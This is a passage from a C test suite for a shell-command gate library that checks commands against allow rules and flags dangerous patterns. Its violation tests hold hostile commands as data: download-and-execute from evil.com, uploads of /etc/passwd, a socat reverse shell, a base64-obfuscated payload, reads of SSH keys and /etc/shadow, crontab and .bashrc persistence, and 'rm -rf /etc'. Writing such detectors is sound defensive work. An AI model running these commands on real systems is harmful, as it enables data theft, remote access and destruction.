  memset(variants, 0, sizeof(variants));
  count = sg_cpl_token_variants_at("emit \"two words\" 42", 2, variants,
                                   ST_MAX_TOKEN_VARIANTS);
  ASSERT(count >= 2 && variants[1].type == ST_TYPE_NUMBER);
  count =
      sg_cpl_token_variants_at("emit \"\"", 1, variants, ST_MAX_TOKEN_VARIANTS);
  ASSERT(count >= 1 && variants[0].type == ST_TYPE_LITERAL);
  count = sg_cpl_token_variants_at("emit \"#n\"", 1, variants,
                                   ST_MAX_TOKEN_VARIANTS);
  ASSERT(count >= 1 && variants[0].type == ST_TYPE_LITERAL);
  for (size_t i = 1; i < count; i++)
    ASSERT(variants[i].type != ST_TYPE_NUMBER);
  ASSERT(sg_cpl_token_variants_at("emit \"unterminated", 1, variants,
                                  ST_MAX_TOKEN_VARIANTS) == 0);

  memset(variants, 0, sizeof(variants));
  ASSERT(sg_cpl_token_variants_at(NULL, 0, variants, ST_MAX_TOKEN_VARIANTS) ==
         0);
  ASSERT(sg_cpl_token_variants_at("", 0, variants, ST_MAX_TOKEN_VARIANTS) == 0);
  ASSERT(sg_cpl_token_variants_at("ls", 1, variants, ST_MAX_TOKEN_VARIANTS) ==
         0);
  ASSERT(sg_cpl_token_variants_at("ls", 0, NULL, ST_MAX_TOKEN_VARIANTS) == 0);
  ASSERT(sg_cpl_token_variants_at("ls", 0, variants, 0) == 0);
}

/* --- EXPANSION CALLBACKS --- */

static sg_expand_status_t expand_canonical(const char *name, size_t name_length,
                                           const char **netargv, size_t *length,
                                           void *ctx) {
  (void)name;
  (void)name_length;
  const char *encoded = ctx;
  if (!encoded)
    return SG_EXPAND_UNRESOLVED;
  *netargv = encoded;
  *length = strlen(encoded);
  return SG_EXPAND_RESOLVED;
}

static sg_expand_status_t expand_home_canonical(const char *name,
                                                size_t name_length,
                                                const char **netargv,
                                                size_t *length, void *ctx) {
  return name_length == 4 && memcmp(name, "HOME", 4) == 0
             ? expand_canonical(name, name_length, netargv, length, ctx)
             : SG_EXPAND_UNRESOLVED;
}

static sg_expand_status_t expand_txt_canonical(const char *pattern,
                                               size_t pattern_length,
                                               const char **netargv,
                                               size_t *length, void *ctx) {
  return pattern_length == 5 && memcmp(pattern, "*.txt", 5) == 0
             ? expand_canonical(pattern, pattern_length, netargv, length, ctx)
             : SG_EXPAND_UNRESOLVED;
}

static sg_expand_status_t expand_invalid_canonical(const char *name,
                                                   size_t name_length,
                                                   const char **netargv,
                                                   size_t *length, void *ctx) {
  (void)name;
  (void)name_length;
  (void)ctx;
  *netargv = NULL;
  *length = 0;
  return (sg_expand_status_t)2;
}

TEST(expansion_callback_matrix) {
  enum expansion_kind { EXPAND_NONE, EXPAND_VARIABLE, EXPAND_GLOB };
  static char home_context[] = "13:/context/home,";
  static char glob_context[] = "7:one.txt,7:two.txt,9:three.txt,";
  static const struct {
    const char *rule;
    const char *input;
    const char *expanded;
    void *context;
    enum expansion_kind kind;
  } cases[] = {
      {"ls #path", "ls $HOME", "ls /context/home", home_context,
       EXPAND_VARIABLE},
      {"echo $UNKNOWN", "echo $UNKNOWN", "echo $UNKNOWN", home_context,
       EXPAND_VARIABLE},
      {"ls #path", "ls ${HOME}", "ls /context/home", home_context,
       EXPAND_VARIABLE},
      {"ls $HOME", "ls $HOME", "ls $HOME", NULL, EXPAND_NONE},
      {"cat * * *", "cat *.txt", "cat one.txt two.txt three.txt", glob_context,
       EXPAND_GLOB},
      {"ls #path project", "ls $HOME project", "ls /context/home project",
       home_context, EXPAND_VARIABLE},
  };

  for (size_t i = 0; i < sizeof(cases) / sizeof(cases[0]); i++) {
    sg_gate_t *g = sg_gate_new();
    ASSERT(g != NULL);
    ASSERT_SG_OK(sg_gate_add_allow_cpl(g, cases[i].rule));
    if (cases[i].kind == EXPAND_VARIABLE)
      ASSERT_SG_OK(sg_gate_set_expand_var_netargv(g, expand_home_canonical,
                                                  cases[i].context));
    else if (cases[i].kind == EXPAND_GLOB)
      ASSERT_SG_OK(sg_gate_set_expand_glob_netargv(g, expand_txt_canonical,
                                                   cases[i].context));

    sg_result_t result;
    ASSERT(eval_cmd(g, cases[i].input, &result) == SG_OK);
    ASSERT(result.verdict == SG_VERDICT_ALLOW);
    ASSERT(result.subcommand_count == 1);
    ASSERT_STR(result.subcommands[0].display_command, cases[i].expanded);
    sg_gate_free(g);
  }

  sg_gate_t *canonical = sg_gate_new();
  ASSERT(canonical != NULL);
  ASSERT_SG_OK(sg_gate_add_allow_cpl(canonical, "cat #f #f"));
  ASSERT_SG_OK(sg_gate_set_expand_glob_netargv(canonical, expand_canonical,
                                               "7:one.txt,7:two.txt,"));
  sg_result_t result;
  ASSERT_SG_OK(eval_cmd(canonical, "cat *.txt", &result));
  ASSERT(result.verdict == SG_VERDICT_ALLOW);
  ASSERT_STR(result.subcommands[0].netargv, "3:cat,7:one.txt,7:two.txt,");
  sg_gate_free(canonical);

  canonical = sg_gate_new();
  ASSERT(canonical != NULL);
  ASSERT_SG_OK(sg_gate_add_allow_cpl(canonical, "echo \"two words\""));
  ASSERT_SG_OK(sg_gate_set_expand_var_netargv(canonical, expand_canonical,
                                              "9:two words,"));
  ASSERT_SG_OK(eval_cmd(canonical, "echo $VALUE", &result));
  ASSERT(result.verdict == SG_VERDICT_ALLOW);
  ASSERT_STR(result.subcommands[0].netargv, "4:echo,9:two words,");
  ASSERT_STR(result.subcommands[0].display_command, "echo two words");
  ASSERT(strcmp(result.subcommands[0].display_command,
                result.subcommands[0].netargv) != 0);
  sg_gate_free(canonical);

  canonical = sg_gate_new();
  ASSERT(canonical != NULL);
  ASSERT_SG_OK(sg_gate_add_allow_cpl(canonical, "echo tail"));
  ASSERT_SG_OK(sg_gate_set_expand_var_netargv(canonical, expand_canonical, ""));
  ASSERT_SG_OK(eval_cmd(canonical, "echo $DROP tail", &result));
  ASSERT(result.verdict == SG_VERDICT_ALLOW);
  ASSERT_STR(result.subcommands[0].netargv, "4:echo,4:tail,");
  sg_gate_free(canonical);

  canonical = sg_gate_new();
  ASSERT(canonical != NULL);
  ASSERT_SG_OK(sg_gate_add_allow_cpl(canonical, "echo \"\" tail"));
  ASSERT_SG_OK(
      sg_gate_set_expand_var_netargv(canonical, expand_canonical, "0:,"));
  ASSERT_SG_OK(eval_cmd(canonical, "echo $EMPTY tail", &result));
  ASSERT_STR(result.subcommands[0].netargv, "4:echo,0:,4:tail,");
  ASSERT(result.verdict == SG_VERDICT_ALLOW);
  sg_gate_free(canonical);

  canonical = sg_gate_new();
  ASSERT(canonical != NULL);
  ASSERT_SG_OK(
      sg_gate_set_expand_var_netargv(canonical, expand_canonical, "3:bad"));
  ASSERT(eval_cmd(canonical, "echo $BAD", &result) == SG_ERR_EXPAND);
  sg_gate_free(canonical);

  canonical = sg_gate_new();
  ASSERT(canonical != NULL);
  ASSERT_SG_OK(sg_gate_set_expand_var_netargv(canonical,
                                              expand_invalid_canonical, NULL));
  ASSERT(eval_cmd(canonical, "echo $BAD", &result) == SG_ERR_EXPAND);
  sg_gate_free(canonical);
}

struct expansion_view {
  const char *netargv;
  size_t length;
};

static sg_expand_status_t expand_requested_length(const char *name,
                                                  size_t name_length,
                                                  const char **netargv,
                                                  size_t *length, void *ctx) {
  (void)name;
  (void)name_length;
  const struct expansion_view *view = ctx;
  *netargv = view->netargv;
  *length = view->length;
  return SG_EXPAND_RESOLVED;
}

static sg_expand_status_t expand_failed(const char *name, size_t name_length,
                                        const char **netargv, size_t *length,
                                        void *ctx) {
  (void)name;
  (void)name_length;
  (void)netargv;
  (void)length;
  (void)ctx;
  return SG_EXPAND_FAILED;
}

static sg_gate_t *gate_with_violations(void);

TEST(expansion_bounds_matrix) {
  sg_result_t result;
  char expansion[4097];
  ASSERT(snprintf(expansion, sizeof(expansion), "4091:") == 5);
  memset(expansion + 5, 'x', 4091);
  expansion[4096] = ',';
  struct expansion_view view = {expansion, sizeof(expansion)};
  sg_gate_t *expanded = sg_gate_new();
  ASSERT(expanded != NULL);
  ASSERT_SG_OK(sg_gate_add_allow_cpl(expanded, "echo *"));
  ASSERT_SG_OK(
      sg_gate_set_expand_var_netargv(expanded, expand_requested_length, &view));
  ASSERT_SG_OK(eval_cmd(expanded, "echo $VALUE", &result));
  ASSERT(!result.truncated);
  ASSERT(result.verdict == SG_VERDICT_ALLOW);
  char too_small[4096] = {0};
  ASSERT(sg_gate_evaluate(expanded, "echo $VALUE", strlen("echo $VALUE"),
                          too_small, sizeof(too_small),
                          &result) == SG_ERR_TRUNC);
  ASSERT(result.truncated);
  ASSERT(result.verdict == SG_VERDICT_UNDETERMINED);
  sg_gate_free(expanded);

  sg_gate_t *gate = sg_gate_new();
  ASSERT(gate != NULL);
  ASSERT_SG_OK(sg_gate_add_allow_cpl(gate, "echo *"));
  ASSERT_SG_OK(sg_gate_set_expand_var_netargv(gate, NULL, NULL));
  ASSERT_SG_OK(sg_gate_set_expand_glob_netargv(gate, NULL, NULL));
  char long_glob[320];
  memcpy(long_glob, "echo ", 5);
  memset(long_glob + 5, '*', 300);
  long_glob[305] = '\0';
  ASSERT_SG_OK(eval_cmd(gate, long_glob, &result));
  ASSERT(!result.truncated);
  ASSERT(result.verdict == SG_VERDICT_ALLOW);
  sg_gate_free(gate);
}

TEST(truncation_cross_product_matrix) {
  sg_gate_t *gate = gate_with_violations();
  ASSERT(gate != NULL);
  ASSERT_SG_OK(sg_gate_add_allow_cpl(gate, "id"));
  ASSERT_SG_OK(sg_gate_add_allow_cpl(gate, "pwd"));
  ASSERT_SG_OK(sg_gate_add_allow_cpl(gate, "cat"));
  ASSERT_SG_OK(sg_gate_set_stop_mode(gate, SG_EVAL_ALL));
  ASSERT_SG_OK(sg_gate_set_reject_mask(gate, 0));

  struct {
    const char *command;
    size_t buffer_size;
    sg_error_t expected_error;
    sg_verdict_t expected_verdict;
    uint32_t expected_count;
    bool expects_dynamic_content;
  } cases[] = {
      {"echo $(id)$(pwd)", 4096, SG_OK, SG_VERDICT_ALLOW_CONDITIONAL, 3, true},
      {"echo $(id)$(pwd)", 16, SG_ERR_TRUNC, SG_VERDICT_UNDETERMINED, 1, true},
      {"cat /etc/passwd ; echo $(id)", 4096, SG_OK,
       SG_VERDICT_ALLOW_CONDITIONAL, 3, true},
      {"cat /etc/passwd ; echo $(id)", 12, SG_ERR_TRUNC,
       SG_VERDICT_UNDETERMINED, 1, true},
      {"echo $(</tmp/direct)", 16, SG_ERR_TRUNC, SG_VERDICT_UNDETERMINED, 1,
       true},
      {"cat <<EOF\n$(id)\nEOF", 16, SG_ERR_TRUNC, SG_VERDICT_UNDETERMINED, 2,
       true},
  };
  for (size_t i = 0; i < sizeof(cases) / sizeof(cases[0]); i++) {
    char buffer[4096];
    sg_result_t result;
    sg_error_t error =
        sg_gate_evaluate(gate, cases[i].command, strlen(cases[i].command),
                         buffer, cases[i].buffer_size, &result);
    ASSERT(error == cases[i].expected_error);
    ASSERT(result.verdict == cases[i].expected_verdict);
    ASSERT(result.subcommand_count == cases[i].expected_count);
    ASSERT(result.truncated == (error == SG_ERR_TRUNC));
    ASSERT(result.requires_substitution_evaluation ==
           cases[i].expects_dynamic_content);
    if (error == SG_ERR_TRUNC)
      ASSERT(result.verdict != SG_VERDICT_ALLOW &&
             result.verdict != SG_VERDICT_ALLOW_CONDITIONAL);
  }

  ASSERT_SG_OK(sg_gate_set_expand_var_netargv(gate, expand_failed, NULL));
  char buffer[4096];
  sg_result_t result;
  ASSERT(sg_gate_evaluate(gate, "echo $VALUE", strlen("echo $VALUE"), buffer,
                          sizeof(buffer), &result) == SG_ERR_EXPAND);
  ASSERT(!result.truncated && result.verdict == SG_VERDICT_UNDETERMINED);

  char many_writes[2048] = {0};
  size_t used = 0;
  for (size_t i = 0; i < SG_MAX_VIOLATIONS + 4; i++) {
    int written =
        snprintf(many_writes + used, sizeof(many_writes) - used,
                 "%secho x > /etc/truncation-%zu", i == 0 ? "" : " ; ", i);
    ASSERT(written > 0 && (size_t)written < sizeof(many_writes) - used);
    used += (size_t)written;
  }
  ASSERT_SG_OK(sg_gate_set_expand_var_netargv(gate, NULL, NULL));
  ASSERT(sg_gate_evaluate(gate, many_writes, used, buffer, sizeof(buffer),
                          &result) == SG_OK);
  ASSERT(!result.truncated);
  ASSERT(result.violation_truncated);
  ASSERT(result.violation_count <= SG_MAX_VIOLATIONS);
  ASSERT(result.violation_dropped_count > 0);
  ASSERT(result.violation_type_flags == result.violation_type_flags);
  char small_buffer[32];
  ASSERT(sg_gate_evaluate(gate, many_writes, used, small_buffer,
                          sizeof(small_buffer), &result) == SG_ERR_TRUNC);
  ASSERT(result.truncated && result.verdict == SG_VERDICT_UNDETERMINED);
  sg_gate_free(gate);
}

TEST(reject_mask_feature_matrix) {
  static const struct {
    const char *command;
    uint32_t feature;
  } cases[] = {
      {"echo $VALUE", SHELL_FEAT_VARS},
      {"echo *.txt", SHELL_FEAT_GLOBS},
      {"while true", SHELL_FEAT_LOOPS},
      {"if true", SHELL_FEAT_CONDITIONALS},
      {"case value", SHELL_FEAT_CASE},
      {"echo $(<file)", SHELL_FEAT_SUBSHELL_FILE},
      {"echo data | cat", SHELL_FEAT_PIPELINE},
      {"cat <<EOF\nhello\nEOF", SHELL_FEAT_HEREDOC},
  };
  for (size_t i = 0; i < sizeof(cases) / sizeof(cases[0]); i++) {
    sg_gate_t *gate = sg_gate_new();
    ASSERT(gate != NULL);
    ASSERT_SG_OK(sg_gate_add_allow_cpl(gate, "echo *"));
    ASSERT_SG_OK(sg_gate_set_reject_mask(gate, cases[i].feature));
    sg_result_t result;
    ASSERT_SG_OK(eval_cmd(gate, cases[i].command, &result));
    ASSERT(result.verdict == SG_VERDICT_REJECT);
    ASSERT(result.subcommand_count == 1);
    ASSERT(result.subcommands[0].substitution_consumer_index == -1);
    ASSERT(result.subcommands[0].group_parent_index == -1);
    sg_gate_free(gate);
  }
}

/* --- VIOLATION SCANNING --- */

static sg_gate_t *gate_with_violations(void) {
  static const char *rules[] = {
      "echo *",    "cat #path", "ls",     "rm *",     "sudo *",
      "curl *",    "chmod *",   "sh",     "bash",     "base64",
      "openssl *", "git *",     "scp *",  "rsync *",  "nc *",
      "crontab",   "head",      "wget *", "python *", "socat *",
      "ngrok *",   "su *",      "passwd", "chgrp *",  "node",
  };
  sg_gate_t *g = gate_with_rules(rules, sizeof(rules) / sizeof(rules[0]));
  if (!g)
    return NULL;
  sg_violation_config_t cfg;
  sg_violation_config_default(&cfg);
  if (sg_gate_set_violation_config_borrowed(g, &cfg) != SG_OK) {
    sg_gate_free(g);
    return NULL;
  }
  return g;
}

typedef struct {
  const char *name;
  const char *dangerous;
  const char *benign;
  uint32_t flag;
  uint32_t min_severity;
  const char *detail_contains;
} violation_case_t;

static bool violation_result_is_consistent(const sg_result_t *result) {
  if ((result->violation_count > 0) != result->has_violations ||
      (result->violation_type_flags != 0) != result->has_violations ||
      result->violation_count > SG_MAX_VIOLATIONS) {
    printf("    inconsistent violation summary: count=%u flags=0x%x has=%d\n",
           result->violation_count, result->violation_type_flags,
           result->has_violations);
    return false;
  }

  uint32_t recorded_flags = 0;
  for (uint32_t i = 0; i < result->violation_count; i++) {
    const sg_violation_t *violation = &result->violations[i];
    if (violation->type == 0 || !violation->description ||
        violation->description[0] == '\0') {
      printf("    incomplete violation record %u: type=0x%x description=%p\n",
             i, violation->type, (void *)violation->description);
      return false;
    }
    recorded_flags |= violation->type;
  }
  bool flags_valid = (recorded_flags & ~result->violation_type_flags) == 0;
  if (result->violation_dropped_count == 0)
    flags_valid = flags_valid && recorded_flags == result->violation_type_flags;
  else
    flags_valid = flags_valid && result->violation_count == SG_MAX_VIOLATIONS;
  if (!flags_valid)
    printf("    violation flags differ: records=0x%x summary=0x%x dropped=%u\n",
           recorded_flags, result->violation_type_flags,
           result->violation_dropped_count);
  return flags_valid;
}

static bool run_violation_case(sg_gate_t *gate,
                               const violation_case_t *test_case) {
  sg_result_t result;
  if (eval_cmd(gate, test_case->dangerous, &result) != SG_OK ||
      !violation_result_is_consistent(&result) || !result.has_violations ||
      !(result.violation_type_flags & test_case->flag)) {
    printf("    case %s did not set expected flag\n", test_case->name);
    return false;
  }

  const sg_violation_t *violation = NULL;
  for (uint32_t i = 0; i < result.violation_count; i++) {
    if (result.violations[i].type == test_case->flag) {
      violation = &result.violations[i];
      break;
    }
  }
  if (!violation || violation->severity < test_case->min_severity ||
      !violation->description ||
      (test_case->detail_contains &&
       (!violation->detail ||
        !strstr(violation->detail, test_case->detail_contains)))) {
    printf("    case %s produced an incomplete violation record\n",
           test_case->name);
    return false;
  }

  if (test_case->benign) {
    if (eval_cmd(gate, test_case->benign, &result) != SG_OK ||
        !violation_result_is_consistent(&result) ||
        (result.violation_type_flags & test_case->flag)) {
      printf("    benign counterpart for %s produced a false positive\n",
             test_case->name);
      return false;
    }
  }
  return true;
}

TEST(violation_rule_matrix) {
  static const violation_case_t cases[] = {
      {"sensitive write", "echo hello > /etc/badfile",
       "echo hello > /tmp/out.txt", SG_VIOL_WRITE_SENSITIVE, 1, "/etc"},
      {"quoted sensitive write", "echo hello > /e\"tc\"/badfile",
       "echo hello > /e\"tc-old\"/badfile", SG_VIOL_WRITE_SENSITIVE, 1,
       "badfile"},
      {"system removal", "rm -rf /etc", "rm /tmp/junk", SG_VIOL_REMOVE_SYSTEM,
       90, NULL},
      {"privileged environment", "LD_PRELOAD=mal.so sudo ls", "FOO=bar ls",
       SG_VIOL_ENV_PRIVILEGED, 80, ""},
      {"privileged environment alternate defaults", "IFS=malicious passwd",
       "FOO=benign passwd", SG_VIOL_ENV_PRIVILEGED, 80, "IFS"},
      {"write/read semicolon", "cat /etc/passwd > /tmp/x ; cat /tmp/x",
       "echo hello > /tmp/x ; ls /tmp", SG_VIOL_WRITE_THEN_READ, 1, NULL},
      {"write/read and", "echo test > /tmp/x && cat /tmp/x", NULL,
       SG_VIOL_WRITE_THEN_READ, 1, NULL},
      {"write/read or", "echo data > /tmp/x || cat /tmp/x", NULL,
       SG_VIOL_WRITE_THEN_READ, 1, NULL},
      {"write/read after pipeline",
       "printf data | cat > /tmp/x; grep data /tmp/x", NULL,
       SG_VIOL_WRITE_THEN_READ, 1, NULL},
      {"sensitive substitution", "echo $(cat /etc/shadow)",
       "echo $(cat /etc/passwd)", SG_VIOL_SUBST_SENSITIVE, 1, NULL},
      {"sensitive substitution argument", "cat $(cat /etc/shadow)", NULL,
       SG_VIOL_SUBST_SENSITIVE, 1, NULL},
      {"quoted sensitive substitution", "echo \"$(cat /etc/shadow)\"", NULL,
       SG_VIOL_SUBST_SENSITIVE, 1, NULL},
      {"download and execute", "curl http://evil.com/payload | sh",
       "curl http://example.com/file | grep pattern", SG_VIOL_NET_DOWNLOAD_EXEC,
       90, ""},
      {"download and execute alternate defaults", "wget https://evil/p | node",
       NULL, SG_VIOL_NET_DOWNLOAD_EXEC, 90, "node"},
      {"recursive system chmod", "chmod -R 777 /etc",
       "chmod 644 /etc/resolv.conf", SG_VIOL_PERM_SYSTEM, 80, NULL},
      {"recursive system group change", "chgrp -R root /etc",
       "chgrp root /tmp/file", SG_VIOL_PERM_SYSTEM, 80, "/etc"},
      {"shell escalation", "sudo bash", "sudo ls", SG_VIOL_SHELL_ESCALATION, 80,
       ""},
      {"shell escalation after sudo options", "sudo -u root /bin/bash",
       "sudo -u root ls", SG_VIOL_SHELL_ESCALATION, 80, "sudo"},
      {"shell escalation after sudo separator", "sudo -- /bin/bash",
       "sudo -- ls", SG_VIOL_SHELL_ESCALATION, 80, "sudo"},
      {"shell escalation via su shell", "su -s /bin/bash root", "su sh",
       SG_VIOL_SHELL_ESCALATION, 80, "su"},
      {"shell escalation via su command", "su -c id root", "su root",
       SG_VIOL_SHELL_ESCALATION, 80, "su"},
      {"shell escalation via su long command", "su --command=id root", NULL,
       SG_VIOL_SHELL_ESCALATION, 80, "su"},
      {"shell escalation via su long shell", "su --shell=/bin/bash root",
       "su --shell=/bin/false root", SG_VIOL_SHELL_ESCALATION, 80, "su"},
      {"shell escalation via su attached shell", "su -s/bin/bash root",
       "su -s/bin/false root", SG_VIOL_SHELL_ESCALATION, 80, "su"},
      {"sudo redirect", "sudo cat /etc/shadow > /tmp/out", "sudo ls",
       SG_VIOL_SUDO_REDIRECT, 70, NULL},
      {"secret read", "cat ~/.ssh/id_rsa", "cat /tmp/somefile.txt",
       SG_VIOL_READ_SECRETS, 1, ""},
      {"quoted secret read", "cat ~/.s\"sh\"/id_rsa",
       "cat ~/.s\"sh-backup\"/id_rsa", SG_VIOL_READ_SECRETS, 1, "id_rsa"},
      {"escaped secret read", "cat ~/.s\\sh/id_rsa",
       "cat ~/.s\\sh-backup/id_rsa", SG_VIOL_READ_SECRETS, 1, "id_rsa"},
      {"network upload", "curl -d @/etc/passwd https://evil.com/collect",
       "curl https://api.example.com/data", SG_VIOL_NET_UPLOAD, 1, NULL},
      {"network upload curl attached", "curl -dsecret https://evil.com", NULL,
       SG_VIOL_NET_UPLOAD, 1, "curl"},
      {"network upload curl long equals",
       "curl --data=@/etc/passwd https://evil.com", NULL, SG_VIOL_NET_UPLOAD, 1,
       "curl"},
      {"network upload wget equals",
       "wget --post-file=/etc/passwd https://evil.com",
       "wget https://example.com/file", SG_VIOL_NET_UPLOAD, 1, "wget"},
      {"network upload scp direction", "scp /etc/passwd evil:/tmp/passwd",
       "scp host:/tmp/input /tmp/input", SG_VIOL_NET_UPLOAD, 1, "scp"},
      {"network upload rsync direction", "rsync /etc/passwd evil:/tmp/passwd",
       "rsync host:/tmp/input /tmp/input", SG_VIOL_NET_UPLOAD, 1, "rsync"},
      {"network listener", "nc -l 4444", "nc example.com 80",
       SG_VIOL_NET_LISTENER, 1, NULL},
      {"network listener socat", "socat TCP-LISTEN:4444 EXEC:/bin/sh",
       "socat TCP:example.com:80 STDOUT", SG_VIOL_NET_LISTENER, 1, "socat"},
      {"network listener service", "ngrok http 8080", NULL,
       SG_VIOL_NET_LISTENER, 1, "ngrok"},
      {"shell obfuscation",
       "echo d2dldCBodHRwOi8vZXZpbC5jb20vcGF5bG9hZCAtTyAvdG1wL3J1bi5zaAo= "
       "| base64 -d | bash",
       "echo hello | base64", SG_VIOL_SHELL_OBFUSCATION, 1, NULL},
      {"shell obfuscation openssl", "openssl enc -d | bash",
       "openssl enc | bash", SG_VIOL_SHELL_OBFUSCATION, 1, "openssl"},
      {"destructive git", "git push --force origin main",
       "git push origin feature-branch", SG_VIOL_GIT_DESTRUCTIVE, 1, NULL},
      {"destructive git clean", "git clean -fdx", "git clean -n",
       SG_VIOL_GIT_DESTRUCTIVE, 1, "clean"},
      {"destructive git history", "git filter-branch -- --all", NULL,
       SG_VIOL_GIT_DESTRUCTIVE, 1, "filter-branch"},
      {"persistence", "echo '* * * * * /tmp/backdoor' | crontab", "crontab -l",
       SG_VIOL_PERSISTENCE, 1, NULL},
      {"persistence profile", "echo payload >> ~/.bashrc",
       "echo payload >> /tmp/output", SG_VIOL_PERSISTENCE, 1, ".bashrc"},
      {"quoted persistence profile", "echo payload >> ~/.b\"ashrc\"",
       "echo payload >> ~/.b\"ash-profile\"", SG_VIOL_PERSISTENCE, 1, "ashrc"},
      {"escaped persistence profile", "echo payload >> ~/.b\\ashrc",
       "echo payload >> ~/.b\\ash-profile", SG_VIOL_PERSISTENCE, 1, "ashrc"},
  };

  sg_gate_t *gate = gate_with_violations();
  ASSERT_SG_OK(sg_gate_set_reject_mask(gate, 0));
  for (size_t i = 0; i < sizeof(cases) / sizeof(cases[0]); i++)
    ASSERT(run_violation_case(gate, &cases[i]));
  sg_gate_free(gate);
}

TEST(group_owned_violation_context) {
  sg_gate_t *gate = gate_with_violations();
  ASSERT(gate != NULL);
  ASSERT_SG_OK(sg_gate_set_reject_mask(gate, 0));
  sg_result_t result = {0};
  ASSERT_SG_OK(
      eval_cmd(gate, "{ echo one; printf two; } > /etc/group-output", &result));
  ASSERT(result.subcommand_count == 2);
  ASSERT(result.violation_type_flags & SG_VIOL_WRITE_SENSITIVE);
  for (uint32_t i = 0; i < result.subcommand_count; i++) {
    ASSERT(result.subcommands[i].write_count == 1);
    ASSERT(result.subcommands[i].read_count == 0);
    ASSERT(result.subcommands[i].violation_type_flags &
           SG_VIOL_WRITE_SENSITIVE);
  }
  sg_gate_free(gate);
}

TEST(group_owned_multiple_redirect_violation_context) {
  sg_gate_t *gate = gate_with_violations();
  ASSERT(gate != NULL);
  ASSERT_SG_OK(sg_gate_set_reject_mask(gate, 0));
  sg_result_t result = {0};
  ASSERT_SG_OK(eval_cmd(
      gate, "{ echo one; printf two; } 3>/tmp/trace >/etc/group-output",
      &result));
  ASSERT(result.subcommand_count == 2);
  ASSERT(result.violation_type_flags & SG_VIOL_WRITE_SENSITIVE);
  for (uint32_t i = 0; i < result.subcommand_count; i++) {
    ASSERT(result.subcommands[i].write_count == 2);
    ASSERT(result.subcommands[i].read_count == 0);
    ASSERT(result.subcommands[i].violation_type_flags &
           SG_VIOL_WRITE_SENSITIVE);
  }
  sg_gate_free(gate);
}

TEST(nested_group_owned_violation_scope) {
  sg_gate_t *gate = gate_with_violations();
  ASSERT(gate != NULL);
  ASSERT_SG_OK(sg_gate_set_reject_mask(gate, 0));
  sg_result_t result = {0};
  ASSERT_SG_OK(eval_cmd(gate,
                        ("{ echo outer-before; { echo inner; } "
                         "4>/tmp/inner-trace >/etc/inner; echo outer-after; } "
                         "3>/tmp/outer-trace >/etc/outer"),
                        &result));
  ASSERT(result.subcommand_count == 3);
  ASSERT(result.violation_type_flags & SG_VIOL_WRITE_SENSITIVE);
  /* Outer redirects apply to every member. Inner redirects apply only to the
   * nested member, so sibling commands must not inherit its I/O context. */
  ASSERT(result.subcommands[0].write_count == 2);
  ASSERT(result.subcommands[1].write_count == 4);
  ASSERT(result.subcommands[2].write_count == 2);
  for (uint32_t i = 0; i < result.subcommand_count; i++) {
    ASSERT(result.subcommands[i].read_count == 0);
    ASSERT(result.subcommands[i].violation_type_flags &
           SG_VIOL_WRITE_SENSITIVE);
  }
  sg_gate_free(gate);
}

TEST(violation_configuration_matrix) {
  enum configuration_kind {
    CONFIG_FANOUT,
    CONFIG_CUSTOM_PATH,
    CONFIG_UNSORTED_NAMES
  };
  static const struct {
    enum configuration_kind kind;
    const char *command;
    uint32_t expected_flag;
    const char *detail_contains;
  } cases[] = {{CONFIG_FANOUT, "echo x > /etc/fanout-test",
                SG_VIOL_REDIRECT_FANOUT, NULL},
               {CONFIG_CUSTOM_PATH, "echo x > /my/custom/data",
                SG_VIOL_WRITE_SENSITIVE, "/my/custom/data"},
               {CONFIG_UNSORTED_NAMES, "wget https://evil/p | node",
                SG_VIOL_NET_DOWNLOAD_EXEC, "node"}};

  for (size_t i = 0; i < sizeof(cases) / sizeof(cases[0]); i++) {
    sg_gate_t *gate = sg_gate_new();
    ASSERT(gate != NULL);
    sg_violation_config_t config;
    sg_violation_config_default(&config);
    if (cases[i].kind == CONFIG_FANOUT) {
      config.redirect_fanout_threshold = 0;
    } else if (cases[i].kind == CONFIG_CUSTOM_PATH) {
      config.sensitive_write_paths[0] = "/my/custom/";
      config.sensitive_write_path_count = 1;
    } else {
      config.download_cmds[0] = "wget";
      config.download_cmds[1] = "curl";
      config.download_cmd_count = 2;
      config.shell_spawn_cmds[0] = "node";
      config.shell_spawn_cmds[1] = "bash";
      config.shell_spawn_cmd_count = 2;
    }
    ASSERT_SG_OK(sg_gate_set_violation_config_borrowed(gate, &config));
    ASSERT_SG_OK(sg_gate_add_allow_cpl(gate, "echo *"));

    sg_result_t result;
    ASSERT(eval_cmd(gate, cases[i].command, &result) == SG_OK);
    ASSERT(violation_result_is_consistent(&result));
    ASSERT(result.violation_type_flags & cases[i].expected_flag);
    const sg_violation_t *record = NULL;
    for (uint32_t j = 0; j < result.violation_count; j++)
      if (result.violations[j].type == cases[i].expected_flag) {
        record = &result.violations[j];
        break;
      }
    ASSERT(record != NULL);
    ASSERT(record->category_flags != 0);
    ASSERT(result.violation_type_flags & cases[i].expected_flag);
    if (!cases[i].detail_contains)
      ASSERT(record->detail == NULL);
    else
      ASSERT(record->detail &&
             strstr(record->detail, cases[i].detail_contains));
    sg_gate_free(gate);
  }
}

TEST(violation_configuration_replacement_is_atomic) {
  sg_gate_t *gate = sg_gate_new();
  ASSERT(gate != NULL);
  sg_violation_config_t config;
  sg_violation_config_default(&config);
  config.sensitive_write_paths[0] = "/opt/custom/";
  config.sensitive_write_path_count = 1;
  ASSERT_SG_OK(sg_gate_set_violation_config_borrowed(gate, &config));
  ASSERT_SG_OK(sg_gate_add_allow_cpl(gate, "echo *"));

  sg_result_t result;
  ASSERT(eval_cmd(gate, "echo x > /opt/custom/file", &result) == SG_OK);
  ASSERT(result.violation_type_flags & SG_VIOL_WRITE_SENSITIVE);

  sg_violation_config_t invalid = config;
  invalid.sensitive_write_path_count = SG_VIOL_MAX_PATHS + 1;
  ASSERT(sg_gate_set_violation_config_borrowed(gate, &invalid) ==
         SG_ERR_INVALID);
  ASSERT(eval_cmd(gate, "echo x > /opt/custom/file", &result) == SG_OK);
  ASSERT(result.violation_type_flags & SG_VIOL_WRITE_SENSITIVE);

  sg_violation_config_default(&config);
  ASSERT_SG_OK(sg_gate_set_violation_config_borrowed(gate, &config));
  ASSERT(eval_cmd(gate, "echo x > /opt/custom/file", &result) == SG_OK);
  ASSERT(!(result.violation_type_flags & SG_VIOL_WRITE_SENSITIVE));
  sg_gate_free(gate);
}

TEST(violation_capacity_contract) {
  char command[2048] = {0};
  size_t used = 0;
  for (size_t i = 0; i < 20; i++) {
    int written = snprintf(command + used, sizeof(command) - used,
                           "%secho x > /etc/capacity-%zu", i ? " ; " : "", i);
    ASSERT(written > 0 && (size_t)written < sizeof(command) - used);
